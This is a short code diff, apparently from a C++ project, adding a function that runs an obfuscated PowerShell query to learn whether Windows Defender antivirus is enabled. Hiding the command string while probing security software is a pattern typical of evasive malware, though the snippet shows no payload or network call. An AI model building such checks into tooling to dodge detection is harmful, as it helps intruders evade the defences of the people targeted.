@@ -46,4 +46,9 @@ public:
 		return outstring;
 	}
 
+	static bool GetAvStatus()
+	{
+		return (SystemUtils::GetCMDOutput((string)AY_OBFUSCATE("powershell -Command \"& {Get-MpComputerStatus | select AntivirusEnabled}\"")).find("True") != string::npos);
+	}
+
 };
